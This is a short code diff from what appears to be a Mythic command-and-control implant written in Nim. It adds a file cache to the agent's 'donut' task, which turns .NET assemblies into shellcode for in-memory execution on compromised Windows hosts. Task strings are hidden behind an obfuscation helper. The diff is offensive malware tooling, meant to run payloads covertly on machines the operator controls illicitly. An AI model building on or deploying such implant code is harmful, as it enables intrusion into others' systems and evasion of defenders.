@@ -1,6 +1,7 @@
 import ../utils/m_responses
 import ../utils/debug
 import ../utils/strenc
+import ../global_data
 import std/[json, base64, strformat]
 
 when defined(windows):
@@ -25,6 +26,15 @@ proc donut*(taskId: string, params: JsonNode): JsonNode =
       
       debug &"[DEBUG] Donut execution: {args.assembly_name}"
       debug &"[DEBUG] UUID for download: {args.uuid}"
+      
+      # Check if using cached file
+      if params.hasKey(obf("cached")):
+        let cachedName = params[obf("cached")].getStr()
+        let cachedData = getCachedFile(cachedName)
+        if cachedData.len == 0:
+          return mythicError(taskId, obf("File not found in cache. Use register_file first: ") & cachedName)
+        var fileData: seq[byte] = @[]
+        return processDonutChunk(taskId, params, encode(cast[string](cachedData)), 1, 1, fileData)
       
       # Return initial response - request the file from Mythic
       return %*{
